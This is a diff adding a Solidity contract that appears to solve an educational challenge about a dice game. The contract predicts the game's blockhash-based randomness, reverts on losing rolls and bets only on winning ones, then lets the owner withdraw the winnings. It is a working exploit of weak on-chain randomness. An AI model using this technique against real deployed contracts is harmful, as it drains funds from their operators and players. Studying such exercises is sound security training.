@@ -1,0 +1,65 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+import "hardhat/console.sol";
+import "./DiceGame.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract RiggedRoll is Ownable {
+    DiceGame public diceGame;
+
+    // Custom Errors defined in the challenge
+    error NotEnoughETH(uint256 required, uint256 available);
+    error NotWinningRoll(uint256 roll);
+    error InsufficientBalance(uint256 requested, uint256 available);
+
+    constructor(address payable diceGameAddress) Ownable(msg.sender) {
+        diceGame = DiceGame(diceGameAddress);
+    }
+
+    // --- Checkpoint 2: Enable receiving ETH ---
+    receive() external payable {}
+
+    // --- Checkpoint 2: The Attack Function ---
+    function riggedRoll() external {
+        uint256 required = 0.002 ether;
+        
+        // 1. Check if we have enough ETH to bet
+        if (address(this).balance < required) {
+            revert NotEnoughETH(required, address(this).balance);
+        }
+
+        // 2. Predict the randomness (Exact same logic as DiceGame.sol)
+        // We look at the previous block hash and the DiceGame's current nonce
+        bytes32 prevHash = blockhash(block.number - 1);
+        uint256 nonce = diceGame.nonce();
+        
+        // 3. Replicate the hash generation
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
+        uint256 roll = uint256(hash) % 16;
+
+        console.log("Predicted Roll:", roll);
+
+        // 4. Check if we win (0, 1, 2, 3, 4, 5 are winners)
+        if (roll > 5) {
+            // IF WE LOSE: Revert the transaction. 
+            // This cancels the bet and saves our money (we only pay gas).
+            revert NotWinningRoll(roll);
+        }
+
+        // IF WE WIN: Call the real contract
+        diceGame.rollTheDice{value: required}();
+    }
+
+    // --- Checkpoint 3: Withdraw Functions ---
+    function withdraw(address _addr, uint256 _amount) external onlyOwner {
+        uint256 available = address(this).balance;
+        
+        if (_amount > available) {
+            revert InsufficientBalance(_amount, available);
+        }
+        
+        (bool success, ) = payable(_addr).call{value: _amount}("");
+        require(success, "Withdraw failed");
+    }
+}
